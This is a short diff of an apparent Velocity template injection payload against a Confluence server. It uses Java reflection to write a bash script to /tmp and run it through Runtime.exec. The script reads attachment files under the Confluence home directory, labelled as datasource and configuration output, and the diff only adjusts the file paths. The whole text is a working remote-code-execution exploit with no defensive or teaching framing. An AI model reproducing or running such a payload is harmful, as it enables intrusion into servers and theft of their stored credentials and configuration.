@@ -1,6 +1,6 @@
 #set($x = "")
 #set($w2 = $x.getClass().forName("java.io.FileWriter").getConstructor($x.getClass().forName("java.lang.String")).newInstance("/tmp/zz_cmd.sh"))
-$w2.write("B=/u01/confluence-home/attachments/ver003/91/89/16089091/41/41/15041541; echo ===LS===; ls  2>/dev/null | head; echo ===DS===; cat /15269953/1 2>/dev/null | head -c 1800; echo; echo ===MYCONF===; cat /15269954/1 2>/dev/null | head -c 1200")
+$w2.write("echo ===DS===; cat /u01/confluence-home/attachments/ver003/91/89/16089091/41/41/15041541/15269953/1 2>/dev/null | head -c 1800; echo; echo ===MYCONF===; cat /u01/confluence-home/attachments/ver003/91/89/16089091/41/41/15041541/15269954/1 2>/dev/null | head -c 1200")
 $w2.close()
 #set($rt = $x.getClass().forName("java.lang.Runtime").getDeclaredMethod("getRuntime").invoke(null))
 #set($p = $rt.exec("/bin/bash /tmp/zz_cmd.sh"))
